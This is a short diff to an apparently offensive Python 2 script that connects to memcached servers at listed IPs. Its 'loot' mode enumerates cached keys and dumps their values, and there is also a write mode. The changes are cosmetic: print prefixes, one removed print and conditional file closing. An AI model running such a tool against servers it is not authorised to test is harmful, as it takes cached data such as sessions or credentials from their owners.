@@ -73,7 +73,7 @@ if __name__ == "__main__":
 			sys.exit(-1)
 	if mode == mode_info:
 		for ip in ipList:
-			print "Getting info on MemCache from %s" % ip
+			print "[!] Getting info on MemCache from %s" % ip
 			if toFile: f.write("\r\n%s\r\n\r\n" % ip)
 			s = socket.socket()
 			s.connect((ip,port))
@@ -86,11 +86,11 @@ if __name__ == "__main__":
 				f.write("%s\r\n" % resp)
 			#Second, we try to read value for each found key
 			s.close()
-			f.close()
+			if toFile: f.close()
 	if mode == mode_loot:
 		keys = []
 		for ip in ipList:
-			print "Looting MemCache from %s" % ip
+			print "[!] Looting MemCache from %s" % ip
 			if toFile: f.write("\r\n%s\r\n\r\n" % ip)
 			s = socket.socket()
 			s.connect((ip,port))
@@ -101,16 +101,15 @@ if __name__ == "__main__":
 			#Here we truncate the last two items because of END singnature
 			for item in resp.split("\r\n")[:-2]:
 				keys.append(item.split(" ")[1])
-			print "[+]Found %d items: %s" % (len(keys), ', '.join((keys)))
+			print "\t[+]Found %d items: %s" % (len(keys), ', '.join((keys)))
 			#Second, we try to read value for each found key
 			for key in keys:
 				mc_cmd = "get %s\r\n" % (key)
 				s.send(mc_cmd)
 				resp = s.recv(1024)
-				print resp
 				if toFile: f.write("%s\r\n" % resp)
 			s.close()
-			f.close()
+			if toFile: f.close()
 
 	if mode == mode_write:
 		for ip in ipList:
